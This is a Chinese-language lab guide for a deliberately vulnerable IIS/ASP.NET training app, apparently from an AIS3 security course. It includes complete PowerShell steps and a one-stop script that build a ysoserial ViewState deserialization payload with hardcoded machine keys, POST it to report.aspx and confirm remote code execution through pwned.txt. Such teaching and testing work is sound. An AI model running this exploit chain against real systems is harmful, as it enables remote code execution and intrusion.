# Windows Server 部署与测试指南

## 📋 前置条件

- Windows Server 已安装 IIS 10+
- ASP.NET 4.8 已启用
- 网站已部署到 `C:\inetpub\wwwroot\VulnerableApp\`
- Git 已安装

---

## 🚀 第一步：更新代码

在 Windows Server 上执行以下命令：

```powershell
# 进入项目目录
cd "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE"

# 从 GitHub 获取最新代码（包含 report.aspx 修复）
git pull origin main
```

**预期输出：**
```
remote: Counting objects: 1, done.
remote: Total 1 (delta 0), reused 1 (delta 0), reused 0
Unpacking objects: 100% (1/1), done.
From https://github.com/zyyuy0u/AIS3_IIS_ASP.NET_Deserialization2RCE
   a4320e0..a6f54d8  main       -> origin/main
Updating a4320e0..a6f54d8
Fast-forward
 website/report.aspx | 9 ++++++---
 1 file changed, 6 insertions(+), 3 deletions(-)
```

---

## 🚀 第二步：复制文件到 IIS

将更新后的 `report.aspx` 复制到 IIS 部署目录：

```powershell
# 复制所有网站文件到 IIS
Copy-Item "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE\website\*" `
    -Destination "C:\inetpub\wwwroot\VulnerableApp\" `
    -Force

# 验证文件是否复制成功
ls "C:\inetpub\wwwroot\VulnerableApp\"
```

**预期输出：**
```
Mode                 Name
----                 ----
-a---          download.aspx
-a---          index.html
-a---          report.aspx (已更新！)
-a---          web.config
```

---

## 🚀 第三步：回收应用池

让 IIS 重新加载 ASP.NET 代码：

```powershell
# 重启应用池（将 VulnerableAppPool 改为实际的应用池名称）
$pool = Get-IISAppPool -Name "VulnerableAppPool"
if ($pool) {
    Stop-IISAppPool -Name "VulnerableAppPool"
    Start-IISAppPool -Name "VulnerableAppPool"
    Write-Host "✅ 应用池已重启"
} else {
    # 如果应用池名称不同，直接用 iisreset
    iisreset /restart
    Write-Host "✅ IIS 已重启"
}
```

---

## ✅ 第四步：验证修改

访问浏览器检查修改是否生效：

```
http://10.41.53.120/report.aspx
```

**检查点：**
- ✅ 页面返回 HTTP 200
- ✅ 页面有表单和输入框
- ✅ 查看页面源代码，检查 __VIEWSTATE 长度

**重要：** 新的 __VIEWSTATE 应该**比之前长得多**（因为 GridView 添加了数据）

```powershell
# 用 PowerShell 检查 __VIEWSTATE 长度
$response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -UseBasicParsing
if ($response.Content -match '__VIEWSTATE" value="([^"]+)"') {
    $viewstate = $matches[1]
    Write-Host "✅ __VIEWSTATE 长度: $($viewstate.Length) 字符"
    Write-Host "   前 100 字符: $($viewstate.Substring(0, 100))"
}
```

**预期：__VIEWSTATE 应该 200+ 字符（比之前的 100 字符长）**

---

## 💥 第五步：进行 RCE 测试

### 5.1 生成恶意 Payload

```powershell
$ysoserial = "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe"
$payloadFile = "$env:TEMP\exploit_payload.bin"

$validationKey = "719B829E1103FBAAFC74A4083971E6022F15407E693470E498CCBD6D7BE489FE"
$decryptionKey = "E64C06018DC70BAE2DB204040F6489E5EAA06C82E4F46EDF671F55DB4C517A64"
$command = 'cmd /c whoami > C:\inetpub\wwwroot\VulnerableApp\pwned.txt'

Write-Host "🔧 生成恶意 Payload..."

& $ysoserial `
  -f LosFormatter `
  -g TypeConfuseDelegate `
  -c $command `
  --validationkey $validationKey `
  --validationalg HMACSHA256 `
  --decryptionkey $decryptionKey `
  --decryptionalg AES `
  > $payloadFile

$payloadBinary = [System.IO.File]::ReadAllBytes($payloadFile)
$payloadBase64 = [System.Convert]::ToBase64String($payloadBinary)

Write-Host "✅ Payload 生成成功！"
Write-Host "   大小: $($payloadBinary.Length) 字节"
Write-Host ""
Write-Host "📋 现在执行：执行 RCE 测试（第 5.2 步）"
```

### 5.2 发送恶意 ViewState

```powershell
# 使用第 5.1 步生成的 $payloadBase64

Write-Host "🚀 发送恶意 __VIEWSTATE 到 report.aspx..."

$body = @{
    "__VIEWSTATE" = $payloadBase64
    "txtReportName" = "exploit"
    "txtReportDate" = "2024-01-01"
}

try {
    $response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" `
        -Method POST `
        -Body $body `
        -ErrorAction SilentlyContinue
    
    Write-Host "📨 POST 请求已发送"
    Write-Host "   响应: $($response.StatusCode)"
} catch {
    Write-Host "⚠️ 页面返回异常（这是正常的）"
}

# 等待命令执行
Start-Sleep -Seconds 3

Write-Host ""
Write-Host "⏳ 现在执行：验证 RCE（第 5.3 步）"
```

### 5.3 验证 RCE 成功

```powershell
Write-Host "✔️ 验证命令是否执行..."
Write-Host ""

# 方法 1：通过 Web 访问 pwned.txt
Write-Host "方法 1：通过 HTTP 访问"
try {
    $result = Invoke-WebRequest -Uri "http://10.41.53.120/pwned.txt" -UseBasicParsing
    Write-Host "🎉 RCE 成功！"
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Write-Host $result.Content
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
} catch {
    Write-Host "❌ pwned.txt 不存在（第一次尝试失败）"
}

Write-Host ""

# 方法 2：直接检查文件
Write-Host "方法 2：直接检查文件"
$pwnedPath = "C:\inetpub\wwwroot\VulnerableApp\pwned.txt"
if (Test-Path $pwnedPath) {
    Write-Host "🎉 RCE 成功！"
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Get-Content $pwnedPath
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
} else {
    Write-Host "❌ pwned.txt 不存在"
    Write-Host "   路径: $pwnedPath"
}
```

---

## 📊 完整测试脚本（一站式）

将以下保存为 `C:\test_rce.ps1`，然后运行：

```powershell
# 保存以下内容到 C:\test_rce.ps1

# ===== 步骤 1：更新代码 =====
Write-Host "════════════════════════════════════"
Write-Host "【步骤 1】从 GitHub 更新代码"
Write-Host "════════════════════════════════════"
cd "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE"
git pull origin main

# ===== 步骤 2：复制文件 =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 2】复制文件到 IIS"
Write-Host "════════════════════════════════════"
Copy-Item "website\*" -Destination "C:\inetpub\wwwroot\VulnerableApp\" -Force
Write-Host "✅ 文件已复制"

# ===== 步骤 3：回收应用池 =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 3】回收应用池"
Write-Host "════════════════════════════════════"
iisreset /restart
Start-Sleep -Seconds 2
Write-Host "✅ IIS 已重启"

# ===== 步骤 4：验证修改 =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 4】验证 report.aspx"
Write-Host "════════════════════════════════════"
$response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -UseBasicParsing
if ($response.Content -match '__VIEWSTATE" value="([^"]+)"') {
    $viewstate = $matches[1]
    Write-Host "✅ report.aspx 返回 HTTP $($response.StatusCode)"
    Write-Host "   __VIEWSTATE 长度: $($viewstate.Length) 字符"
}

# ===== 步骤 5：生成 Payload =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 5】生成恶意 Payload"
Write-Host "════════════════════════════════════"
$ysoserial = "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe"
$payloadFile = "$env:TEMP\exploit.bin"
$validationKey = "719B829E1103FBAAFC74A4083971E6022F15407E693470E498CCBD6D7BE489FE"
$decryptionKey = "E64C06018DC70BAE2DB204040F6489E5EAA06C82E4F46EDF671F55DB4C517A64"
$command = 'cmd /c whoami > C:\inetpub\wwwroot\VulnerableApp\pwned.txt'

& $ysoserial -f LosFormatter -g TypeConfuseDelegate -c $command `
  --validationkey $validationKey --validationalg HMACSHA256 `
  --decryptionkey $decryptionKey --decryptionalg AES > $payloadFile

$payloadBinary = [System.IO.File]::ReadAllBytes($payloadFile)
$payloadBase64 = [System.Convert]::ToBase64String($payloadBinary)
Write-Host "✅ Payload 已生成 ($($payloadBinary.Length) 字节)"

# ===== 步骤 6：发送 RCE =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 6】发送恶意 ViewState"
Write-Host "════════════════════════════════════"
$body = @{
    "__VIEWSTATE" = $payloadBase64
    "txtReportName" = "test"
    "txtReportDate" = "2024-01-01"
}
Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -Method POST -Body $body -ErrorAction SilentlyContinue | Out-Null
Write-Host "✅ POST 已发送"
Start-Sleep -Seconds 3

# ===== 步骤 7：验证 =====
Write-Host ""
Write-Host "════════════════════════════════════"
Write-Host "【步骤 7】验证 RCE 是否成功"
Write-Host "════════════════════════════════════"
$pwnedPath = "C:\inetpub\wwwroot\VulnerableApp\pwned.txt"
if (Test-Path $pwnedPath) {
    Write-Host "🎉 RCE 成功！命令已执行"
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━"
    Get-Content $pwnedPath
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━"
} else {
    Write-Host "❌ RCE 失败，pwned.txt 未创建"
    Write-Host "   检查路径: $pwnedPath"
}
```

运行测试：
```powershell
powershell -ExecutionPolicy Bypass -File C:\test_rce.ps1
```

---

## 🔧 故障排查

### 问题 1：report.aspx 仍返回 Runtime Error

**解决方案：**
```powershell
# 1. 清除 ASP.NET 临时文件
rm "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\*" -Recurse -Force

# 2. 重启 IIS
iisreset /restart

# 3. 重新访问页面
```

### 问题 2：pwned.txt 未创建

**检查点：**
```powershell
# 1. 检查 IIS 应用池身份是否有写入权限
icacls "C:\inetpub\wwwroot\VulnerableApp"

# 2. 检查 ysoserial 是否正确生成了 payload
ls "$env:TEMP\exploit.bin"

# 3. 检查事件查看器中的错误
Get-EventLog -LogName "Application" -Source ".NET Runtime" -Newest 10
```

### 问题 3：__VIEWSTATE 长度没有增加

**说明：** GridView 可能没有被正确加载
```powershell
# 1. 检查 report.aspx 源代码是否包含 GridView
Get-Content "C:\inetpub\wwwroot\VulnerableApp\report.aspx" | Select-String "GridView"

# 2. 如果没有，重新复制文件
Copy-Item "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE\website\report.aspx" `
    -Destination "C:\inetpub\wwwroot\VulnerableApp\report.aspx" -Force
```

---

## ✅ 验收标准

| 步骤 | 预期结果 | 状态 |
|------|--------|------|
| git pull | 代码已更新 | ✅/❌ |
| 文件复制 | report.aspx 已复制到 IIS | ✅/❌ |
| 访问页面 | HTTP 200 + __VIEWSTATE 长 | ✅/❌ |
| LFI 测试 | 能读取 web.config | ✅/❌ |
| Payload 生成 | 2000+ 字节 payload | ✅/❌ |
| RCE 发送 | POST 请求已发送 | ✅/❌ |
| **RCE 验证** | **pwned.txt 已创建** | **✅** |

---

## 📝 测试记录表

记录每次测试的结果：

| 时间 | 步骤 | 结果 | 备注 |
|------|------|------|------|
| | git pull | ✅/❌ | |
| | 文件复制 | ✅/❌ | |
| | IIS 重启 | ✅/❌ | |
| | report.aspx | ✅/❌ | |
| | Payload 生成 | ✅/❌ | |
| | RCE 发送 | ✅/❌ | |
| | **RCE 验证** | **✅/❌** | |

---

## 🎓 关键概念回顾

**修复前的问题：**
- report.aspx 缺少复杂对象在 ViewState 中
- ASP.NET 框架不会反序列化 ViewState
- Gadget chain 无法被触发

**修复后的工作原理：**
```
1. 添加 GridView → 会在 ViewState 中保存数据对象
2. ASP.NET 框架在 LoadViewState 时反序列化
3. 反序列化过程中触发 gadget chain
4. 💥 远程代码执行成功！
```

---

**现在开始测试吧！祝你成功！** 🚀
